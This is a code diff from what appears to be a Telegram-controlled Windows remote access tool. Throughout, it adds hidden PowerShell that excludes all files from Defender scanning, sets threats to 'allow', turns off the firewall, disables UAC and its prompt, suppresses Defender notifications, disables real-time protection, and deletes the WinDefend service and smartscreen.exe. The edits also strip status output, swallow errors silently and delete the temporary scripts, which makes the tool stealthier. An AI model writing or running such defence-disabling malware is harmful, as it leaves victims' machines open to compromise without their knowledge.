@@ -948,27 +948,51 @@ def handle_disable_registry_tools(message):
 @bot.message_handler(commands=['dwinsec'])
 def handle_disable_windows_security(message):
     error_log_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security_errors.log')
+    script_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security.ps1')
 
     powershell_script = f"""
     $error.Clear()  # Clear any previous errors
     $errorLog = '{error_log_path}'
+    
     try {{
-        Add-MpPreference -ExclusionExtension '*' 2>>$errorLog;
-        Set-MpPreference -EnableControlledFolderAccess Disabled 2>>$errorLog;
-        Set-MpPreference -PUAProtection disable 2>>$errorLog;
-        Set-MpPreference -HighThreatDefaultAction 6 -Force 2>>$errorLog;
-        Set-MpPreference -ModerateThreatDefaultAction 6 -Force 2>>$errorLog;
-        Set-MpPreference -LowThreatDefaultAction 6 -Force 2>>$errorLog;
-        Set-MpPreference -SevereThreatDefaultAction 6 -Force 2>>$errorLog;
-        Set-MpPreference -ScanScheduleDay 8 2>>$errorLog;
-        netsh advfirewall set allprofiles state off;
-        Set-MpPreference -MAPSReporting 0 2>>$errorLog;
-        Set-MpPreference -SubmitSamplesConsent 2 2>>$errorLog;
-        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Name 'LowRiskFileTypes' -Value '.vbs;.js;.exe;.bat;.cmd;.msi;.reg;.ps1;' 2>>$errorLog;
-        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1' -Name '1806' -Value '0' 2>>$errorLog;
-        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2' -Name '1806' -Value '0' 2>>$errorLog;
-        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3' -Name '1806' -Value '0' 2>>$errorLog;
-        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4' -Name '1806' -Value '0' 2>>$errorLog;
+        # Disable Windows Defender settings
+        Add-MpPreference -ExclusionExtension '*' 2>>$errorLog
+        Set-MpPreference -EnableControlledFolderAccess Disabled 2>>$errorLog
+        Set-MpPreference -PUAProtection disable 2>>$errorLog
+        Set-MpPreference -HighThreatDefaultAction 6 -Force 2>>$errorLog
+        Set-MpPreference -ModerateThreatDefaultAction 6 -Force 2>>$errorLog
+        Set-MpPreference -LowThreatDefaultAction 6 -Force 2>>$errorLog
+        Set-MpPreference -SevereThreatDefaultAction 6 -Force 2>>$errorLog
+        Set-MpPreference -ScanScheduleDay 8 2>>$errorLog
+        netsh advfirewall set allprofiles state off
+        Set-MpPreference -MAPSReporting 0 2>>$errorLog
+        Set-MpPreference -SubmitSamplesConsent 2 2>>$errorLog
+
+        # Ensure registry paths exist and create them if necessary
+        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations')) {{
+            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Force
+        }}
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Name 'LowRiskFileTypes' -Value '.vbs;.js;.exe;.bat;.cmd;.msi;.reg;.ps1;' 2>>$errorLog
+        
+        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1')) {{
+            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1' -Force
+        }}
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1' -Name '1806' -Value '0' 2>>$errorLog
+        
+        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2')) {{
+            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2' -Force
+        }}
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2' -Name '1806' -Value '0' 2>>$errorLog
+        
+        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3')) {{
+            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3' -Force
+        }}
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3' -Name '1806' -Value '0' 2>>$errorLog
+        
+        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4')) {{
+            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4' -Force
+        }}
+        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4' -Name '1806' -Value '0' 2>>$errorLog
     }} catch {{
         Write-Host "An error occurred: $($_.Exception.Message)"
     }} finally {{
@@ -979,7 +1003,6 @@ def handle_disable_windows_security(message):
     }}
     """
 
-    script_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security.ps1')
     try:
         with open(script_path, 'w') as script_file:
             script_file.write(powershell_script)
@@ -990,14 +1013,14 @@ def handle_disable_windows_security(message):
             stderr=subprocess.PIPE,
             creationflags=subprocess.CREATE_NO_WINDOW
         )
-        error_output = result.stderr.decode('utf-8')
-
+        
+        error_output = result.stderr.decode('utf-8').strip()
         if result.returncode == 0:
             bot.send_message(message.chat.id, "Windows security settings have been disabled.")
         else:
             if os.path.exists(error_log_path):
                 with open(error_log_path, 'r') as f:
-                    error_content = f.read()
+                    error_content = f.read().strip()
                 bot.send_message(message.chat.id, f"Errors occurred:\n{error_content}")
             else:
                 bot.send_message(message.chat.id, f"An error occurred: {error_output}")
@@ -1131,22 +1154,36 @@ def disable_uac():
         try:
             value, _ = winreg.QueryValueEx(reg_key, "EnableLUA")
             if value == 0:
-                print("UAC is already disabled.")
                 return
         except FileNotFoundError:
             pass
-
-        command = r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
-        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
-        if ret < 32:
-            raise ctypes.WinError(ctypes.get_last_error())
-        else:
-            print("UAC has been disabled.")
+        
+        powershell_script = """
+        reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v EnableLUA /t REG_DWORD /d 0 /f
+        """
+        
+        script_path = os.path.join(os.getenv('TEMP'), 'disable_uac.ps1')
+        
+        with open(script_path, 'w') as script_file:
+            script_file.write(powershell_script)
+        
+        result = subprocess.run(
+            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
+            shell=True,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        if result.returncode != 0:
+            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
+        
     except Exception as e:
         print(f"An error occurred: {e}")
 
-    winreg.CloseKey(reg_key)
+    finally:
+        winreg.CloseKey(reg_key)
+        if os.path.exists(script_path):
+            os.remove(script_path)
 
 # Disable UAC admin prompt by modifying registry
 def disable_uac_prompt():
@@ -1159,22 +1196,36 @@ def disable_uac_prompt():
         try:
             value, _ = winreg.QueryValueEx(reg_key, "ConsentPromptBehaviorAdmin")
             if value == 0:
-                print("UAC prompt behavior for administrators is already set to 'Never notify'.")
                 return
         except FileNotFoundError:
             pass
-
-        command = r'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f'
-        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
-        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
-        if ret < 32:
-            raise ctypes.WinError(ctypes.get_last_error())
-        else:
-            print("UAC prompt behavior for administrators has been disabled.")
+        
+        powershell_script = """
+        reg add 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+        """
+        
+        script_path = os.path.join(os.getenv('TEMP'), 'disable_uac_prompt.ps1')
+        
+        with open(script_path, 'w') as script_file:
+            script_file.write(powershell_script)
+        
+        result = subprocess.run(
+            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
+            shell=True,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        if result.returncode != 0:
+            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
+        
     except Exception as e:
-        print(f"An error occurred: {e}")
-    
-    winreg.CloseKey(reg_key)
+        pass
+
+    finally:
+        winreg.CloseKey(reg_key)
+        if os.path.exists(script_path):
+            os.remove(script_path)
 
 # Suppress Defender Notifications by modifying registry
 def suppress_windows_defender_notifications():
@@ -1187,22 +1238,36 @@ def suppress_windows_defender_notifications():
         try:
             value, _ = winreg.QueryValueEx(reg_key, "Notification_Suppress")
             if value == 1:
-                print("Windows Defender notifications are already suppressed.")
                 return
         except FileNotFoundError:
             pass
-
-        command = r'reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f'
-        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
-        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
-        if ret < 32:
-            raise ctypes.WinError(ctypes.get_last_error())
-        else:
-            print("Windows Defender notifications have been suppressed.")
+        
+        powershell_script = """
+        reg add "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
+        """
+        
+        script_path = os.path.join(os.getenv('TEMP'), 'suppress_windows_defender_notifications.ps1')
+        
+        with open(script_path, 'w') as script_file:
+            script_file.write(powershell_script)
+        
+        result = subprocess.run(
+            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
+            shell=True,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        if result.returncode != 0:
+            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
+        
     except Exception as e:
-        print(f"An error occurred: {e}")
+        pass
 
-    winreg.CloseKey(reg_key)
+    finally:
+        winreg.CloseKey(reg_key)
+        if os.path.exists(script_path):
+            os.remove(script_path)
 
 # Disable Defender Real-Time Protection by modifying registry
 def disable_defender_realtime_protection():
@@ -1215,66 +1280,99 @@ def disable_defender_realtime_protection():
         try:
             value, _ = winreg.QueryValueEx(reg_key, "DisableRealtimeMonitoring")
             if value == 1:
-                print("Real-time protection is already disabled.")
                 return
         except FileNotFoundError:
             pass
-
-        command = r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'
-        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
-        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
-        if ret < 32:
-            raise ctypes.WinError(ctypes.get_last_error())
-        else:
-            print("Real-time protection has been disabled.")
+        
+        powershell_script = """
+        reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+        """
+        
+        script_path = os.path.join(os.getenv('TEMP'), 'disable_defender_realtime_protection.ps1')
+        
+        with open(script_path, 'w') as script_file:
+            script_file.write(powershell_script)
+        
+        result = subprocess.run(
+            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
+            shell=True,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        if result.returncode != 0:
+            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
+        
     except Exception as e:
-        print(f"An error occurred: {e}")
+        pass
 
-    winreg.CloseKey(reg_key)
+    finally:
+        winreg.CloseKey(reg_key)
+        if os.path.exists(script_path):
+            os.remove(script_path)
 
 # Disable startup, stop and delete WinDefend
 def manage_windows_defender():
     try:
-        subprocess.run(["sc", "config", "WinDefend", "start= disabled"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-        print("Successfully disabled start-up for WinDefend.")
+        powershell_script = """
+        sc config WinDefend start= disabled
+        sc stop WinDefend
+        sc delete WinDefend
+        """
+        
+        script_path = os.path.join(os.getenv('TEMP'), 'manage_windows_defender.ps1')
+        
+        with open(script_path, 'w') as script_file:
+            script_file.write(powershell_script)
+        
+        result = subprocess.run(
+            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
+            shell=True,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        if result.returncode != 0:
+            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
+        
+    except Exception as e:
+        pass
 
-        subprocess.run(["sc", "stop", "WinDefend"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-        print("Successfully stopped WinDefend.")
-
-        subprocess.run(["sc", "delete", "WinDefend"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-        print("Successfully deleted WinDefend.")
-    except subprocess.CalledProcessError as e:
-        print(f"An error occurred: {e}")
+    finally:
+        if os.path.exists(script_path):
+            os.remove(script_path)
 
 # Change permission, kill and delete smartscreen
 def manage_smartscreen():
     try:
-        subprocess.run(
-            ["takeown", "/f", r"%systemroot%\System32\smartscreen.exe", "/a"],
-            check=True
+        powershell_script = """
+        takeown /f "%systemroot%\\System32\\smartscreen.exe" /a
+        icacls "%systemroot%\\System32\\smartscreen.exe" /grant:r Administrators:F /c
+        taskkill /im smartscreen.exe /f
+        del "%systemroot%\\System32\\smartscreen.exe" /s /f /q
+        """
+        
+        script_path = os.path.join(os.getenv('TEMP'), 'manage_smartscreen.ps1')
+        
+        with open(script_path, 'w') as script_file:
+            script_file.write(powershell_script)
+        
+        result = subprocess.run(
+            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
+            shell=True,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
         )
-        print("Ownership was changed to Administrators.")
+        
+        if result.returncode != 0:
+            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
+        
+    except Exception as e:
+        pass
 
-        subprocess.run(
-            ["icacls", r"%systemroot%\System32\smartscreen.exe", "/grant:r", "Administrators:F", "/c"],
-            check=True
-        )
-        print("Administrators has granted Full Control permissions.")
-
-        subprocess.run(
-            ["taskkill", "/im", "smartscreen.exe", "/f"],
-            check=True
-        )
-        print("smartscreen.exe killed successfully.")
-
-        subprocess.run(
-            ["del", r"%systemroot%\System32\smartscreen.exe", "/s", "/f", "/q"],
-            check=True
-        )
-        print("smartscreen.exe deleted successfully.")
-
-    except subprocess.CalledProcessError as e:
-        print(f"An error occurred: {e}")
+    finally:
+        if os.path.exists(script_path):
+            os.remove(script_path)
 
 # Check if a scheduled task exists
 def task_exists(task_name):
